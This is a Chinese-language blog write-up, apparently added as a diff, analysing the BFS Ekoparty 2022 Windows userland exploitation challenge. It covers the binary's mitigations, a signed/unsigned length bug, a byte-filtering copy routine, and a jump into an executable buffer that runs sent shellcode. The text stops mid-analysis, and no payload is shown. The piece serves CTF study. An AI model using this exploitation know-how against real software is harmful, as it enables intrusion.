@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Windows userland PWN  在逛论坛时发现一个Linux kernel的pwn题目，同时还有一个Windows，本来以为也是内核态，下载后发现是用户态，研究一下 网址：BFS Ekoparty 2022 Exploitation Challenges真好，还能直接发offer😭 eko弹出计算机就算成功，不能使用额外的库。  在本机win11 24h2进行调试  winchec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BFS-Ekoparty2022-windows-pwn">
+<meta property="og:url" content="https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/index.html">
+<meta property="og:site_name" content="ham5t3r">
+<meta property="og:description" content="Windows userland PWN  在逛论坛时发现一个Linux kernel的pwn题目，同时还有一个Windows，本来以为也是内核态，下载后发现是用户态，研究一下 网址：BFS Ekoparty 2022 Exploitation Challenges真好，还能直接发offer😭 eko弹出计算机就算成功，不能使用额外的库。  在本机win11 24h2进行调试  winchec">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-03T17:09:08.898Z">
+<meta property="article:author" content="ham5t3r">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BFS-Ekoparty2022-windows-pwn</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/28/hypervisor-in-rust-0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&text=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&is_video=false&description=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BFS-Ekoparty2022-windows-pwn&body=Check out this article: https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&name=BFS-Ekoparty2022-windows-pwn&description=&lt;blockquote&gt;
+&lt;p&gt;Windows userland PWN&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在逛论坛时发现一个Linux kernel的pwn题目，同时还有一个Windows，本来以为也是内核态，下载后发现是用户态，研究一下&lt;/p&gt;
+&lt;p&gt;网址：&lt;a href=&#34;https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/&#34;&gt;BFS Ekoparty 2022 Exploitation Challenges&lt;/a&gt;真好，还能直接发offer😭&lt;/p&gt;
+&lt;h2 id=&#34;eko&#34;&gt;&lt;a href=&#34;#eko&#34; class=&#34;headerlink&#34; title=&#34;eko&#34;&gt;&lt;/a&gt;eko&lt;/h2&gt;&lt;p&gt;弹出计算机就算成功，不能使用额外的库。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在本机win11 24h2进行调试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;winchecksec&lt;/p&gt;
+&lt;figure class=&#34;highlight pwsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bfs&lt;span class=&#34;literal&#34;&gt;-eko2022&lt;/span&gt; ❯ winchecksec .\bfs&lt;span class=&#34;literal&#34;&gt;-eko2022&lt;/span&gt;.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Warn: No load config &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; the PE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Results &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;: .\bfs&lt;span class=&#34;literal&#34;&gt;-eko2022&lt;/span&gt;.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Dynamic Base    : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ASLR            : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;High Entropy VA : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Force Integrity : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Isolation       : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX              : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SEH             : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CFG             : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RFG             : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SafeSEH         : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotApplicable&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GS              : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Authenticode    : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.NET            : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;x64dbg 插件：&lt;a href=&#34;https://github.com/klks/checksec&#34;&gt;checksec: x64dbg plugin to check security settings&lt;/a&gt;，可以看相关dll的保护。&lt;/p&gt;
+&lt;p&gt;没有GS保护？但是使用IDA打开&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&t=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#eko"><span class="toc-number">1.</span> <span class="toc-text">eko</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        BFS-Ekoparty2022-windows-pwn
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ham5t3r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-03T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categorievariants/CSE/">CSE</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>Windows userland PWN</p>
+</blockquote>
+<p>在逛论坛时发现一个Linux kernel的pwn题目，同时还有一个Windows，本来以为也是内核态，下载后发现是用户态，研究一下</p>
+<p>网址：<a target="_blank" rel="noopener" href="https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/">BFS Ekoparty 2022 Exploitation Challenges</a>真好，还能直接发offer😭</p>
+<h2 id="eko"><a href="#eko" class="headerlink" title="eko"></a>eko</h2><p>弹出计算机就算成功，不能使用额外的库。</p>
+<ul>
+<li>在本机win11 24h2进行调试</li>
+</ul>
+<p>winchecksec</p>
+<figure class="highlight pwsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bfs<span class="literal">-eko2022</span> ❯ winchecksec .\bfs<span class="literal">-eko2022</span>.exe</span><br><span class="line">Warn: No load config <span class="keyword">in</span> the PE</span><br><span class="line">Results <span class="keyword">for</span>: .\bfs<span class="literal">-eko2022</span>.exe</span><br><span class="line">Dynamic Base    : <span class="string">&quot;Present&quot;</span></span><br><span class="line">ASLR            : <span class="string">&quot;Present&quot;</span></span><br><span class="line">High Entropy VA : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Force Integrity : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Isolation       : <span class="string">&quot;Present&quot;</span></span><br><span class="line">NX              : <span class="string">&quot;Present&quot;</span></span><br><span class="line">SEH             : <span class="string">&quot;Present&quot;</span></span><br><span class="line">CFG             : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">RFG             : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">SafeSEH         : <span class="string">&quot;NotApplicable&quot;</span></span><br><span class="line">GS              : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Authenticode    : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">.NET            : <span class="string">&quot;NotPresent&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>x64dbg 插件：<a target="_blank" rel="noopener" href="https://github.com/klks/checksec">checksec: x64dbg plugin to check security settings</a>，可以看相关dll的保护。</p>
+<p>没有GS保护？但是使用IDA打开</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000140001474</span>                 mov     rcx, [rsp+<span class="number">0F</span>68h+var_18]</span><br><span class="line">.text:<span class="number">000000014000147</span>C                 <span class="keyword">xor</span>     rcx, rsp        ; StackCookie</span><br><span class="line">.text:<span class="number">000000014000147F</span>                 call    __security_check_cookie</span><br><span class="line">.text:<span class="number">0000000140001484</span>                 add     rsp, <span class="number">0F</span>68h</span><br><span class="line">.text:<span class="number">000000014000148B</span>                 retn</span><br></pre></td></tr></table></figure>
+
+<p>创建一个socket，接收消息: <code>0.0.0.0:31415</code></p>
+<p>接收0x1000长度的消息，接收握手消息<code>Hello</code>，发送 <code>Hi</code></p>
+<p>然后进入一个处理函数</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_140001240</span><span class="params">(SOCKET a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-F48h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+24h] [rbp-F44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> lena; <span class="comment">// [rsp+24h] [rbp-F44h]</span></span><br><span class="line">  CHAR CmdLine[<span class="number">3840</span>]; <span class="comment">// [rsp+30h] [rbp-F38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+F30h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">11</span>]; <span class="comment">// [rsp+F40h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i += <span class="number">16</span> )            <span class="comment">// 初始化buf</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)&amp;::buf[i] = <span class="number">0x5050505050505050</span>i64;</span><br><span class="line">    *(_QWORD *)&amp;::buf[i + <span class="number">8</span>] = <span class="number">0xCF58585858585858</span>ui64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot; [+] Processing request\n&quot;</span>);</span><br><span class="line">  len = <span class="built_in">recv</span>(a1, buf, <span class="number">11</span>, <span class="number">0</span>);                   <span class="comment">// 接收cookie</span></span><br><span class="line">  <span class="keyword">if</span> ( len == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Client data error\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0xB</span>ui64 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Bad size\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)buf != <span class="string">&#x27;2202okE&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Wrong cookie value\n&quot;</span>);</span><br><span class="line">  v7 = buf[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">8</span>] != <span class="string">&#x27;T&#x27;</span> )                          <span class="comment">// type</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Invalid packet type\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(__int16 *)&amp;buf[<span class="number">9</span>] &gt; <span class="number">0xF00</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Invalid packet size\n&quot;</span>);</span><br><span class="line">  lena = <span class="built_in">recv</span>(a1, ::buf, *(<span class="type">unsigned</span> __int16 *)&amp;buf[<span class="number">9</span>], <span class="number">0</span>);<span class="comment">// int16 -&gt; uint16 小变大</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot; [+] Data received: %i bytes\n&quot;</span>, lena);</span><br><span class="line">  <span class="built_in">sub_1400011B0</span>(CmdLine, ::buf, lena);          <span class="comment">// 内存copy</span></span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  [+] Message received: %s\n&quot;</span>, CmdLine);</span><br><span class="line">    <span class="built_in">send</span>(a1, CmdLine, lena, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  [-] Unsupported message\n&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    <span class="built_in">send</span>(a1, aUnsupportedMes_1, v2 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="string">&#x27;X&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    off_14000C000 = (__int64 (__fastcall *)(_QWORD))&amp;::buf[lena];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">off_14000C000</span>(CmdLine);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>内存copy函数，某些字符在copy时会被替换为0。（看到后面发现这是一个提示？</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF736B511B0</span><span class="params">(_BYTE *a1, _BYTE *a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a2 == <span class="number">0x2B</span> || *a2 == <span class="number">0x33</span> )</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      *a1 = *a2;</span><br><span class="line">    ++a2;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>int16 -&gt; unsigned int16 可以是负数转化后变为一个很大的数字，这样可以读的缓冲区就很大了。</p>
+<p>可以修改 v7 为 <code>X</code>，但是不能太长，因为存在GS保护。</p>
+<p>最后执行这个函数</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v7 == <span class="string">&#x27;X&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    off_14000C000 = (__int64 (__fastcall *)(_QWORD))&amp;::buf[lena];</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">off_14000C000</span>(CmdLine);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个一个virtualAlloc的区域</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">buf = (<span class="type">char</span> *)<span class="built_in">VirtualAlloc</span>((LPVOID)<span class="number">0x10000000</span>, <span class="number">0x1000</span>ui64, <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>最后一个属性：0x40代表 <strong>PAGE_EXECUTE_READWRITE</strong> 表明这片区域可执行。因此最后是跳转到我们输入的shellcode执行。</p>
+<p>初始化的时候，写了数据，反编译后</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">debug033:<span class="number">0000000010000000</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000001</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000002</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000003</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000004</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000005</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000006</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000007</span>                 push    rax</span><br><span class="line">debug033:<span class="number">0000000010000008</span>                 pop     rax</span><br><span class="line">debug033:<span class="number">0000000010000009</span>                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>A                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000B</span>                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>C                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>D                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000</span>E                 pop     rax</span><br><span class="line">debug033:<span class="number">000000001000000F</span>                 iret</span><br></pre></td></tr></table></figure>
+
+<p>无论如何最后还是得执行这一段代码中的某些部分</p>
+<p>iret 的作用：IRET(interrupt return)中断返回，中断服务程序的最后一条指令。IRET指令将推入堆栈的段地址和偏移地址弹出，使程序返回到原来发生中断的地方。相当于<strong>POP <code>RIP|CS|RFLAGS|SP|SS</code></strong></p>
+<p>这里主要是段寄存器的处理，因为与寻址有关。在 real mode 下 <code>cs:ip = cs &lt;&lt; 4 + ip</code></p>
